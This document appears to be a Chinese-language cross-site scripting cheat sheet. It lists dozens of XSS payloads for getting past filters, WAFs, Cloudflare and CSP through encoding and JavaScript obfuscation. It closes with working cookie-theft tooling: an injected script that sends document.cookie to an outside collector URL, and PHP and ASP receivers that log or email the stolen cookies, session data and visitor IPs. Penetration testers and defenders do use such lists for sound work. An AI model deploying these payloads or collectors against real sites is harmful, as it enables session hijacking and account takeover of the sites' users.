<dd%09onclick=alert(1)>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
<img/11111111111111111111111111111/src=x/onerror=alert(1)>
<input onclick=alert(1) value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>
跨站脚本攻击测试的特大秘诀便是：“见框就插”

这些标签都是闭合优先级高于双引号完整性优先级的特殊标签。
<!--
<iframe>
<noframes>
<noscript>
<script>
<style>
<textarea>
<title>
<xmp>

（很多情况，都会忽略svg表签）
<svg/onload=confirm(doucument.domain)>


"><sCrI%20pT%20>PrOmPt('1')</ScrI%20pt>">


<sCrI%20pT%20>PrOmPt`1`</ScrI%20pt>


绕过<>:
u003cimg src=1 onerror=alert(/xss/)u003e

<img src="</title><img src=x onerror=alert(1)//"\>

<script>location.href;'javascript:alert%281%29'</script>

%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/



大小写绕过
<sCrIpt>alert(1)</ScRipt>


绕过标签黑名单
<script x>alert('XSS')<script y>


不完整的HTML标签绕过
可用于IE/Firefox/Chrome/Safari
<img src='1' onerror='alert(0)' <


绕过字符串的引号
String.fromCharCode(88,83,83)


你可以使用 ' 在mousedown实践中绕过单引号
<a href="" onmousedown="var name = '';alert(1)//'; alert('smthg')">Link</a>


绕过点（.）的限制
<script>window['alert'](document['domain'])</script>


绕过括号和分号
//来自@garethheyes
<script>onerror=alert;throw 1337</script>

<script>{onerror=alert}throw 1337</script>

<script>throw onerror=alert,'some string',123,'haha'</script>

// 来自 @terjanq 
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
// 来自 @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>

绕过 onxxxx= 黑名单
object onafterscriptexecute=confirm(0)>

<object onbeforescriptexecute=confirm(0)>

绕过 onxxx= 过滤通过空字节/垂直标签,filter with a null byte/vertical tab
<img src='1' onerror\x00=alert(0) />

<img src='1' onerror\x0b=alert(0) />

// Bypass onxxx= filter with a '/' 
<img src='1' onerror/=alert(0) />


绕过空格过滤
//使用 / 绕过空格过滤
<img/src='1'/onerror=alert(0)>

//使用 0x0c/^L 绕过空格过滤
<svg0x0c/^Lonload=alert(1)>


绕过电子邮件过滤
"><svg/onload=confirm(1)>"@x.y


绕过文档黑名单
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>

在字符串中使用javascript绕过
<script>foo="text </script><script>alert(1)</script>";</script>


使用其他方式绕过重定向限制
location="http://google.com"

document.location = "http://google.com"

document.location.href="http://google.com"

window.location.assign("http://google.com")

window['location']['href']="http://google.com"


使用其他方式执行alert
来自 brutelogic tweet@
window['alert']

parent['alert']

self['alert']

top['alert']

this['alert']

frames['alert']

content['alert']

map(alert)

find(alert)

every(alert)

filter(alert)

findIndex(alert)

forEach(alert);

来自 quanyang tweet@
prompt`${document.domain}`

document.location='java\tscript:alert(1)'

document.location='java\rscript:alert(1)'

document.location='java\tscript:alert(1)'


来自 404death tweet@
eval('ale'+'rt(0)');

Function("ale"+"rt(1)")();

new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();

[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);

top[8680439..toString(30)](7);

top[/al/.source+/ert/.source](8);

top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');

location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;

setTimeout('ale'+'rt(2)');

setInterval('ale'+'rt(10)');

Set.constructor('ale'+'rt(13)')();

Set.constructor`al\x65rt\x2814\x29;

使用其他方式出发alert
var i = document.createElement("iframe");
i.onload = function(){ 
 i.contentWindow.alert(1)
;}
document.appendChild(i);


//绕过安全机制
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {      
var proxy = obj[name];      
obj[name] = function () {       
 if (exec_original) {          
return proxy.apply(this, arguments);      
 }      
};     
XSSObject.lockdown(obj, name);  };XSSObject.proxy(window, 'alert', 'window.alert', false);


不使用任何东西绕过 ">"
不必去闭合标签
<svg onload=alert(1)//

'te' * alert('*') * 'xt';

'te' / alert('/') / 'xt';

'te' % alert('%') % 'xt';

'te' - alert('-') - 'xt';

'te' + alert('+') + 'xt';

'te' ^ alert('^') ^ 'xt';

'te' > alert('>') > 'xt';

'te' < alert('<') < 'xt';

'te' == alert('==') == 'xt';

'te' & alert('&') & 'xt';

'te' , alert(',') , 'xt';

'te' | alert('|') | 'xt';

'te' ? alert('ifelsesh') : 'xt';

'te' in alert('in') in 'xt';

'te' instanceof alert('instanceof') instanceof 'xt';


使用HTML编码绕过
%26%2397;lert(1)


使用Katana绕过
katakana：https://github.com/aemkei/katakana.js
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()

使用Lontara绕过
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()

使用ECMAScript6绕过
<script>alert`1`</script>


使用八进制编码绕过
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'

使用Unicode转换为大写绕过
İ (%c4%b0).toLowerCase() => i

ı (%c4%b1).toUpperCase() => I

ſ (%c5%bf) .toUpperCase() => S

K (%E2%84%AA).toLowerCase() => k


使用UTF-7编码绕过
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-


使用UTF-8编码绕过
< = %C0%BC = %E0%80%BC = %F0%80%80%BC

> = %C0%BE = %E0%80%BE = %F0%80%80%BE

' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7

" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

" = %CA%BA

' = %CA%B9


使用UTF-16be编码绕过
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>

使用UTF-32编码绕过
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E

使用BOM（浏览器对象模型）绕过
字节顺序标记(页面必须以BOM字符开始)。BOM字符允许您覆盖页面的字符集UTF-16编码的BOM字符：
大端字节 : 0xFE 0xFF
小端字节 : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
UTF-32编码的BOM字符：
大端字节 : 0x00 0x00 0xFE 0xFF
小端字节 : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E

使用奇怪的编码绕过
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

<img src="1" onerror="alert(1)" />

<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>


<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>

<scriptscript>


CSP（内容安全策略）绕过
使用Google的JSONP绕过CSP
//google.com/complete/search?client=chrome&jsonp=alert(1);

<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"

<script>alert(document.domain)</script>uxldz


Cloudflare XSS绕过//来自 Bohdan Korzhynskyi 
<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>


//来自RakeshMane10
<svg/onload=alert()//


常见的WAF绕过

Chrome审计
</script><svg><script>alert(1)-%26apos%3B

anythinglr00</script><script>alert(document.domain)</script>uxldz

anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>

<svg onload\r\n=$.globalEval("al"+"ert()");>

?"></script><base%20c%3D=href%3Dhttps:\mysite>

<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>

<a href=javascript:alert(1)>

<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>



<?php
$ip = $_SERVER['REMOTE_ADDR'];
$to='xxx@yeah.net';
$referer = $_SERVER['HTTP_REFERER'];
$cookie = $_GET['cookie']; 
$session = $_GET['session'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$subject='远程XSS获取地址-域名：'.$referer;
$body="<p> 远程管理员IP= ".$ip."<p> 访问时间=" . date('d-m-Y').
"<p> 后台地址=".$referer."<p> 浏览器类型=".$agent."<p> 当前页面地址=".$referer."<p> COOKIE信息=".$cookie."<p> Session信息=".$$session.'&nbsp;'.
$headers= 'MIME-Version: 1.0' . "\r\n";
$headers.= 'Content-type: text/html; charset=utf-8' . "\r\n";
$headers.="Cleanreport.com";
mail($to, $subject, $body, $headers);
?>



<script>document.write('<img	src="http://url/news.asp?msg='+document.cookie+'"
width=0 height=0 border=0 />');</script>


news.asp代码：
<%
msg=Request.ServerVariables("QUERY_STRING")
testfile=Server.MapPath("cook.txt")
set fs=server.CreateObject("scripting.filesystemobject")
set thisfile=fs.OpenTextFile(testfile,8,True,0)
thisfile.Writeline(""&msg& "")
thisfile.close
set fs = nothing
%>


PHP版代码：
<?php
$cookie = $_GET['c'];
$ip = getenv ('REMOTE_ADDR');
$time=date("j F, Y, g:i a");
$referer=getenv ('HTTP_REFERER');
$fp = fopen('cook.txt', 'a');
fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: '
.$time. '<br> Referer: '.$referer.'<br><br><br>');
fclose
?>



